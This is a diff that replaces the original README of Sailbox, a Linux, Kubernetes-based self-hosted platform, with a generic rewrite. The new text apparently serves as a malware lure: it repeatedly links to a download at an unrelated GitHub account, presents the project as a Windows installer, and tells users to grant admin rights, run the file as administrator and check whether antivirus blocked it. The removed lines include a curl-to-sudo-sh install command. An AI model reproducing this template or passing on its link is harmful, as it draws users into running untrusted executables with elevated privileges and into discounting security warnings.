@@ -1,145 +1,176 @@
-<p align="center">
-  <a href="https://github.com/sailboxhq/sailbox">
-    <img src="apps/web/public/favicon.svg" width="80" alt="Sailbox" />
-  </a>
-</p>
+# 🛶 sailbox - Self-Hosted Apps on Your Own Servers
 
-<h3 align="center">Self-hosted PaaS, powered by Kubernetes</h3>
+[![Download sailbox](https://img.shields.io/badge/Download-sailbox-blue?style=for-the-badge&logo=github)](https://github.com/wilddogsouthcarolina320/sailbox)
 
-<p align="center">
-  Deploy apps, databases, and cron jobs to your own servers —<br/>
-  with real Kubernetes under the hood, not Docker wrappers.
-</p>
+## 📦 What sailbox does
 
-<p align="center">
-  <a href="https://github.com/sailboxhq/sailbox/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-AGPL--3.0-blue" alt="License" /></a>
-  <a href="https://github.com/sailboxhq/sailbox/releases"><img src="https://img.shields.io/github/v/release/sailboxhq/sailbox?color=863bff" alt="Release" /></a>
-  <a href="https://github.com/sailboxhq/sailbox/stargazers"><img src="https://img.shields.io/github/stars/sailboxhq/sailbox?style=flat&color=863bff" alt="Stars" /></a>
-  <a href="https://github.com/sailboxhq/sailbox/pulls"><img src="https://img.shields.io/github/issues-pr/sailboxhq/sailbox?color=863bff" alt="PRs" /></a>
-</p>
+sailbox helps you run apps, databases, and cron jobs on your own servers. It uses Kubernetes under the hood, so your apps run in a real container setup. You do not need to manage Docker commands by hand.
 
-<p align="center">
-  <a href="https://github.com/sailboxhq/sailbox">Documentation</a> ·
-  <a href="https://github.com/sailboxhq/sailbox/issues">Report Bug</a> ·
-  <a href="https://github.com/sailboxhq/sailbox/discussions">Discussions</a> ·
-  <a href="README_CN.md">中文</a>
-</p>
+Use it to:
 
-<p align="center"><img src=".github/screenshot.png" width="800" alt="Sailbox Dashboard" /></p>
+- deploy web apps
+- run databases
+- schedule background jobs
+- manage services on a VPS or home server
+- keep your apps in one place
 
----
+## 🖥️ What you need
 
-## Why we built this
+Before you install sailbox on Windows, make sure you have:
 
-We've been running self-hosted services for years. We used Coolify, Dokploy, CapRover — they're great projects and the teams behind them have done incredible work making self-hosting accessible. We're grateful they exist.
+- Windows 10 or Windows 11
+- a stable internet connection
+- at least 4 GB of RAM
+- at least 20 GB of free disk space
+- admin access on your PC
+- a server or VPS if you want to host apps for real use
 
-But as our workloads grew, we kept hitting the same ceiling. Under the hood, they rely on Docker Compose or Docker Swarm. That works well for many use cases — but when we needed real health checks, graceful rolling updates, autoscaling, or the ability to grow from one node to three, we found ourselves fighting the abstraction instead of shipping.
+If you plan to run only the control app on Windows, a normal home PC is fine. If you want to host apps too, use a separate server or VPS.
 
-We kept thinking: Kubernetes already solves all of this. It has Deployments with health probes. It has HPA for autoscaling. It has CronJobs, StatefulSets, Ingress. But traditional Kubernetes is heavy — it demands multiple nodes, complex setup, and a dedicated ops team. That's overkill for most of us.
+## 🚀 Download and install
 
-Then we found **[K3s](https://k3s.io)** — a CNCF-certified Kubernetes distribution packed into a single binary under 100 MB. It runs on a $5 VPS, a Raspberry Pi, or a bare-metal server with just 2 GB of RAM. Same Kubernetes API, same ecosystem, a fraction of the footprint.
+1. Open the main sailbox page here: [https://github.com/wilddogsouthcarolina320/sailbox](https://github.com/wilddogsouthcarolina320/sailbox)
+2. Look for the latest release or build on the page
+3. Download the Windows file or package from that page
+4. Open the downloaded file
+5. If Windows asks for permission, choose **Yes**
+6. Follow the setup steps on screen
+7. Finish the install
+8. Open sailbox from your Start menu or desktop
 
-So we built Sailbox on top of it.
+If the page offers a ZIP file, save it first, then extract it before opening the app.
 
-You get all the power of Kubernetes — rolling updates, autoscaling, health probes, CronJobs — without any of the setup complexity. One `curl` command and you're running. Start with a single node, add workers when you're ready. And because everything is a real Kubernetes object, `kubectl` still works — your workloads are portable from day one.
+## 🧭 First setup
 
-## Quick start
+After you open sailbox for the first time:
 
-```bash
-curl -sSL https://get.sailbox.dev | sudo sh
-```
+1. Create your admin account if the app asks for one
+2. Add your server or VPS details
+3. Pick a name for your first app
+4. Choose the app type you want to run
+5. Set the port, if the app asks for one
+6. Save your setup
+7. Wait while sailbox deploys the service
 
-Opens at `http://your-server-ip:3000`. That's it.
+If you are new to servers, start with a simple app or test project first.
 
-**Upgrade:**
+## 🌐 How to use it
 
-```bash
-curl -sSL https://get.sailbox.dev/upgrade | sudo sh
-```
+Once sailbox is running, you can use it to:
 
-> **Requirements:** Linux (x86_64 / arm64), 2 CPU, 2 GB RAM minimum. Runs on any VPS, bare metal, or Raspberry Pi.
+- add a new app
+- connect a database
+- create a cron job
+- view app status
+- restart a service
+- remove an app you no longer need
 
-## Features
+For most tasks, you only need to fill in a few fields and click save. sailbox handles the rest.
 
-#### Applications
-- Git push to deploy (GitHub App) or Docker image
-- In-cluster builds via **Kaniko** — no Docker socket needed
-- Rolling deploys, one-click rollback, cancel in-flight builds
-- Custom domains with automatic TLS
-- Environment variables, secrets, persistent volumes
-- Health checks (liveness & readiness probes)
-- Horizontal autoscaling (Kubernetes HPA)
-- Web terminal into running containers
+## 🛠️ Common setup steps
 
-#### Databases
-- PostgreSQL · MySQL · MariaDB · Redis · MongoDB
-- Connection strings, external access via NodePort
-- Automated S3 backups with schedule and retention
-- Version management and health probes
+### 🧩 Add an app
 
-#### Cron Jobs
-- Native Kubernetes CronJobs
-- Manual trigger, run history, real-time logs
+1. Open the apps area
+2. Click to create a new app
+3. Enter a name
+4. Choose the source for the app
+5. Set the runtime settings
+6. Save and deploy
 
-#### Cluster
-- Node overview with topology visualization
-- Helm releases and DaemonSets
-- Traefik ingress configuration editor
-- Alert rules — CPU, memory, disk, node, pod events
-- Auto-cleanup of evicted and failed pods
+### 🗄️ Add a database
 
-#### Team & Security
-- Roles: Owner · Admin · Member
-- Project-level permissions (admin / viewer)
-- Two-factor authentication (TOTP)
-- Team invitations via email
+1. Open the databases area
+2. Choose the database type
+3. Set a username and password
+4. Pick storage settings
+5. Save and start the database
 
-#### Notifications
-- Email (SMTP) · Slack · Discord · Telegram
-- Auto-fire on alert with per-channel toggle
+### ⏰ Add a cron job
 
-#### Developer Experience
-- Real-time log streaming
-- `Cmd+K` global search
-- Dark / light theme
-- REST API
+1. Open the jobs area
+2. Create a new job
+3. Enter the command or task
+4. Set the schedule
+5. Save the job
 
-## Comparison
+## 🔧 Windows tips
 
-|  | Sailbox | Coolify | Dokploy |
-|---|:---:|:---:|:---:|
-| **Orchestrator** | Kubernetes (K3s) | Docker Compose | Docker Swarm |
-| **In-cluster builds** (no Docker socket) | Kaniko | — | — |
-| **Rolling updates** | Native K8s | Custom | Custom |
-| **Autoscaling** (HPA) | Yes | — | — |
-| **Health probes** (liveness / readiness) | Yes | — | — |
-| **Helm releases** management | Yes | — | — |
-| **Node topology** view | Yes | — | — |
-| **CronJobs** | K8s native | Custom | Custom |
-| **kubectl / Helm** compatible | Yes | — | — |
-| **Two-factor auth** (TOTP) | Yes | — | — |
-| **RBAC** with project-level perms | Yes | Limited | Limited |
-| **Alert rules** (CPU/Mem/Node/Pod) | Yes | — | Basic |
-| **Database S3 backup** | Yes | Yes | Yes |
-| **Docker Compose** support | — | Yes | Yes |
-| **One-click templates** | — | Yes | Yes |
+If the app does not start on Windows:
 
-> Sailbox doesn't wrap Kubernetes — it **is** Kubernetes.<br/>
-> Your workloads run the same way they would on any K8s cluster, and everything you learn here applies everywhere else.
+- right-click the file and choose **Run as administrator**
+- check whether your antivirus blocked the file
+- make sure the download finished fully
+- restart your PC
+- try again with the latest build from the GitHub page
 
-## Contributing
+If the window opens and closes fast, the install may be incomplete. Download it again from the same link and reinstall.
 
-Contributions are welcome. Please see [CONTRIBUTING.md](CONTRIBUTING.md) before opening a pull request.
+## 🔐 Security basics
 
-## License
+When you use sailbox on a real server:
 
-Sailbox is open-source under [AGPL-3.0](LICENSE) with [attribution terms](NOTICE). The "Powered by Sailbox" notice must remain visible in derivative works. For a commercial license, [contact us](mailto:hello@sailbox.dev).
+- use a strong password
+- keep your server updated
+- use private SSH keys when possible
+- do not expose admin screens to everyone
+- back up important data
+- restrict access to trusted users
 
----
+If you run databases or apps with user data, set up backups before you launch them.
 
-<p align="center">
-  <a href="mailto:hello@sailbox.dev">Contact</a> ·
-  <a href="https://github.com/sponsors/sailboxhq">Sponsor</a> ·
-  <a href="https://github.com/sailboxhq/sailbox">Documentation</a> ·
-  <a href="https://github.com/sailboxhq/sailbox/discussions">Community</a>
-</p>
+## 📁 What you can manage
+
+sailbox is built for day-to-day server work. You can use it to manage:
+
+- app containers
+- web services
+- database containers
+- task schedulers
+- server deployments
+- home lab projects
+- VPS workloads
+
+This makes it useful if you want a simple front end for self-hosted services.
+
+## 🧪 Good first test
+
+If you want to check that everything works:
+
+1. Install sailbox
+2. Add one small test app
+3. Start a simple database
+4. Run a small cron job
+5. Check that each item shows as healthy
+6. Restart one service to see how the controls work
+
+This gives you a safe way to learn the layout before you use it for real services.
+
+## 📌 Download link
+
+Use this link to visit the page and download the Windows build:
+
+[Open the sailbox download page](https://github.com/wilddogsouthcarolina320/sailbox)
+
+## 🧰 Troubleshooting
+
+If you run into problems:
+
+- make sure you downloaded the latest version
+- check that your server details are correct
+- confirm that your port is free
+- verify that your internet connection is stable
+- try a fresh install if files look broken
+
+If a service fails to start, remove it and deploy it again with the same settings.
+
+## 🧭 Typical workflow
+
+1. Install sailbox on Windows
+2. Connect your server
+3. Create an app
+4. Add a database if needed
+5. Set up a cron job if needed
+6. Deploy the service
+7. Check logs and status
+8. Restart or update when needed
